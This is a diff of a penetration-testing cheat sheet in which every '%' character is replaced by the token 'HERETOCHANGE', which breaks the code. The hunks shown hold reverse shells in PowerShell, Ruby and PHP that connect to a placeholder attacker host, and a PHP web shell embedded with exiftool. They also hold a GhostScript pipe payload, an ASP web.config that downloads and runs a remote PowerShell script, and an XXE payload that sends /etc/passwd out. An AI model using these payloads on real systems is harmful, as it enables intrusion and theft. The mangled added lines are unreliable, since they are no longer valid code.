@@ -4605,7 +4762,7 @@ su
 
 > https://github.com/decoder-it/LocalPotato
 
-> https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc
+> https://github.com/blackarrowsec/redteam-research/tree/master/LPEHERETOCHANGE20viaHERETOCHANGE20StorSvc
 
 Modify the following file and build the solution.
 
@@ -4887,15 +5044,15 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
 #### GhostScript
 
 ```c
-%!PS-Adobe-3.0 EPSF-3.0
-%%BoundingBox: -0 -0 100 100
+HERETOCHANGE!PS-Adobe-3.0 EPSF-3.0
+HERETOCHANGEHERETOCHANGEBoundingBox: -0 -0 100 100
 userdict /setpagedevice undef
 save
 legal
 { null restore } stopped { pop } if
 { legal } stopped { pop } if
 restore
-mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
+mark /OutputFile (HERETOCHANGEpipeHERETOCHANGEcat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
 ```
 
 #### nishang
@@ -5018,15 +5175,15 @@ php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 ##### PowerShell Reverse Shell
 
 ```c
-$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|HERETOCHANGE{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 ```c
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|HERETOCHANGE{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 ```c
-powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|HERETOCHANGE{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 
 ##### minireverse.ps1
@@ -5109,7 +5266,7 @@ echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,sock
 ##### Ruby Reverse Shell
 
 ```c
-ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&HERETOCHANGEd >&HERETOCHANGEd 2>&HERETOCHANGEd",f,f,f)'
 ```
 
 #### ScareCrow
@@ -5212,7 +5369,7 @@ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$f
 <configuration>
    <system.webServer>
       <handlers accessPolicy="Read, Script, Write">
-         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="HERETOCHANGEwindirHERETOCHANGE\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
       </handlers>
       <security>
          <requestFiltering>
@@ -5227,12 +5384,12 @@ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$f
    </system.webServer>
 </configuration>
 <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
-<%
+<HERETOCHANGE
 Set s = CreateObject("WScript.Shell")
 Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
 o = cmd.StdOut.Readall()
 Response.write(o)
-%>
+HERETOCHANGE>
 -->
 ```
 
@@ -5385,7 +5542,7 @@ def main():
     redirectHandler = redirect_handler_factory(redirect_url)
 
     handler = SocketServer.TCPServer((host, port), redirectHandler)
-    print("serving at port %s" % port)
+    print("serving at port HERETOCHANGEs" HERETOCHANGE port)
     handler.serve_forever()
 
 if __name__ == "__main__":
@@ -5414,8 +5571,8 @@ r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cook
 
 ```c
 <?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
-"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
+<!DOCTYPE foo [<!ENTITY HERETOCHANGE <NAME> SYSTEM 
+"http://<LHOST>/<FILE>.dtd">HERETOCHANGE<NAME>;]>
 <root>
 <method>GET</method>
 <uri>/</uri>
@@ -5429,8 +5586,8 @@ r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cook
 ##### Content of <FILE>.dtd
 
 ```c
-<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
-%eval;
-%exfiltrate;
+<!ENTITY HERETOCHANGE file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY HERETOCHANGE eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=HERETOCHANGEfile;'>">
+HERETOCHANGEeval;
+HERETOCHANGEexfiltrate;
 ```
